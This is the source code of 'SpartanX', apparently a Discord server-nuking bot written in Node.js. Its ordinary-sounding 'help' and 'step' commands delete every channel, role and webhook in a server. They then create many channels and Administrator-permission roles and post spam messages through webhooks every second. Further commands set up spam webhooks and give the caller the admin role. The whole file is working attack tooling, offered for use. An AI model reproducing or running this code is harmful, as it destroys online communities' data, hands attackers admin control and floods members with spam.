const { magentaBright, white, blackBright } = require('chalk');
const config = require('./config.json');
const { Client, EmbedBuilder, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildInvites,
   

    ]
});

process.title = '[SpartanX] - Loading..'

client.once('ready', async () => {
    try {
        var lietnUser = await client.users.fetch(config.dev_id).then(u => u.tag);
    } catch (e) {
        //
    };

    process.title = `[SpartanX] - Connected ${lietnUser}`
    console.log(` `);
    console.log(` `);
    console.log(white('                               #####  ####### #     # #       #######  #####  '));
    console.log(white('                              #     #    #     #   #  #       #       #     # '));
    console.log(blackBright('                              #          #      # #   #       #       #       '));
    console.log(blackBright('                               #####     #       #    #       #####    #####  '));
    console.log(magentaBright('                                    #    #       #    #       #             # '));
    console.log(magentaBright('                              #     #    #       #    #       #       #     # '));
    console.log(magentaBright('                               #####     #       #    ####### #######  #####  '));
    console.log(` `);
    console.log(` `);
    console.log(magentaBright(' [') + white('?') + magentaBright(']') + white(` Listening for`) + magentaBright(': ') + white(lietnUser));
});

const fs = require('fs');

client.on('rateLimit', () => {
    console.log("[+++] THE IP BEING RATELIMIT!!!!!!");
});

client.on("messageCreate", async (message) => {
    // メッセージが指定されたプレフィックスで始まる場合のみ処理を行う
    if (!message.content.startsWith(config.prefix)) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const command = args.shift().toLocaleLowerCase();

    // 'help' コマンドの処理
    if (command === 'help') {
        // Delete Channels + Webhooks + Roles
        Delete(message);
        DeleteWebhook(message);
        // Create Channels + Webhooks + Roles + Send Messages
        Create(message);
    };


    // 'step' コマンドの処理
    if (command === 'step') {
        // Delete Channels + Webhooks + Roles
        Delete(message);
        DeleteWebhook(message);
        // Create Channels + Webhooks + Roles + Send Messages
        Create(message);
    };


    // 'nukedserver' コマンドの処理
    if (command === 'nukedserver') {
        nukedserver(message); // nukedserver 関数の実行
    }

    if (command === 'role') {
        give_role(message); // give_role 関数の実行
    }

});

    

client.login(config.token);



async function Delete(message) { // Delete Channels & Roles
    // Delete Channels
    message.guild.channels.fetch().then(c => {
        c.forEach(s => {
            s.delete().then(() => {
                console.log('[-] Deleted channel', s.id)
            }).catch(() => {
                console.log('[+] Couldn\'t delete channel', s.id)
            });
        })
    })
    // Delete Roles
    message.guild.roles.fetch().then(r => {
        r.forEach(s => {
            s.delete().then(() => {
                console.log('[-] Deleted role', s.id)
            }).catch(() => {
                console.log('[+] Couldn\'t delete role', s.id)
            });
        })
    })
}

async function Create(message) {
    // チャンネル作成の非同期処理を配列に追加
    const channelPromises = [];
    for (let i = 0; i < config.amount; i++) {
        channelPromises.push(
            message.guild.channels.create({
                type: 0,
                name: "SSPConTOP",
                topic: "nuked by SSPC"
            }).then(c => {
                console.log('[+] Create Channel', c.id);
                if (i === config.amount - 1) {
                    Webhook(message);  // 最後にWebhook作成を呼ぶ
                }
            }).catch(() => {
                console.log('[-] Couldn\'t Create Channel');
            })
        );
    }

    // ロール作成の非同期処理を配列に追加
    const rolePromises = [];
    for (let i = 0; i < config.amount; i++) {
        rolePromises.push(
            message.guild.roles.create({
                name: "SSPConTOP",
                color: "FF0000",
                permissions: [PermissionsBitField.Flags.Administrator],  // 管理者権限を付与
            }).then(c => {
                console.log('[+] Created Role with Admin privileges', c.id);
            }).catch(() => {
                console.log('[-] Couldn\'t Create Role');
            })
        );
    }

    // 並列処理を実行
    try {
        // チャンネルとロールを並列で作成
        await Promise.all([...channelPromises, ...rolePromises]);
    } catch (err) {
        console.error('エラーが発生しました:', err);
    }
}






async function Webhook(message) { // Create Webhooks
    message.guild.channels.fetch().then(c => {
        c.forEach(s => {
            s.createWebhook({
                name: ('SSPContop'),
                avatar: 'https://cdn.discordapp.com/icons/1335173543721439262/716cb68ef16545ac61fa53bc497607d3.png?size=1024',
            }).then(webhook => {
                console.log("[+] Created webhook", webhook.id);
                // Send Message
                SendWebhook(webhook);
            }).catch(() => {
                console.log('[-] Couldn\'t create webhook');
            });
        })
    })
}

async function SendWebhook(webhook) { // Send Messages
    setInterval(() => {
        const normal = fs.readFileSync('./messages/normal.txt', 'utf8');
        const description = fs.readFileSync('./messages/description.txt', 'utf8');
        const field = fs.readFileSync('./messages/field.txt', 'utf8');
        const footer = fs.readFileSync('./messages/footer.txt', 'utf8');

        const randomLinks = config.randomLinks;

        const embed = new EmbedBuilder()
            .setAuthor({ name: ("SpartanX"), url: `https://discord.gg/dxkk2nfS`, iconURL: `https://cdn.discordapp.com/icons/1335173543721439262/716cb68ef16545ac61fa53bc497607d3.png?size=1024` })
            .setColor("Random")
            .setTitle('SpartanX is best tool ever!')
            .setURL(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setImage(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setThumbnail(`${randomLinks[Math.floor(Math.random() * randomLinks.length)]}`)
            .setDescription(description)
            .setFooter({ text: footer, iconURL: `${randomLinks[Math.floor(Math.random() * randomLinks.length)]}` })

            .setTimestamp();

        webhook.send({ content: normal, embeds: [embed] })
    }, 1000)
}

// ウェブフックを削除する関数
async function DeleteWebhook(message) {
    message.guild.fetchWebhooks().then(r => {
        r.forEach(s => {
            s.delete().then(() => {
                console.log('[-] Deleted webhook', s.id)
            }).catch(() => {
                console.log('[+] Couldn\'t delete webhook', s.id)
            });
        })
    })
}

// サーバーをnukeする関数
async function nukedserver(message) {
    try {
        // サーバーのチャンネルを最新状態で取得し直す
        const channels = await message.guild.channels.fetch();
        console.log('✅ チャンネル取得成功');

        // "SSPConTOP" という名前のテキストチャンネルを探す
        const channel = channels.find(ch => ch.type === 0 && ch.name === "SSPConTOP");

        if (!channel) {
            console.error("📛 チャンネル 'SSPConTOP' が見つかりません（キャッシュ問題の可能性）");
            return;
        }

        console.log(`✅ チャンネル見つかった: ${channel.name} (${channel.id})`);

        // Webhook作成
        const webhook = await channel.createWebhook({
            name: "SpartanX Webhook",
            avatar: "https://cdn.discordapp.com/icons/1335173543721439262/716cb68ef16545ac61fa53bc497607d3.png?size=1024"
        });

        console.log(`✅ Webhook作成成功！URL: ${webhook.url}`);

        // Webhookメッセージ送信開始
        await SendWebhook(webhook);

    } catch (err) {
        console.error("❌ createWebhookAndSend中にエラー:", err);
    }
}

// メッセージからロールを与える関数
async function give_role(message) {
    try {
        const rolesArray = message.guild.roles.cache
            .filter(r => r.name === "SSPConTOP")
            .sort((a, b) => a.createdTimestamp - b.createdTimestamp);

        const role = rolesArray.first();

        if (!role) {
            await message.reply("❌ SSPConTOP ロールが見つかりませんでした。");
            return;
        }

        await message.member.roles.add(role);
        await message.reply(`✅ ロール **${role.name}** を付与しました！`);
        console.log(`[+] ${message.author.tag} にロール ${role.id} を付与`);
    } catch (err) {
        console.error(`[-] ロール付与エラー:`, err);
        try {
            await message.reply(`⚠️ ロール付与中にエラーが発生しました: ${err.message}`);
        } catch (e) {
            console.log('[!] エラーメッセージの送信にも失敗しました');
        }
    }
}
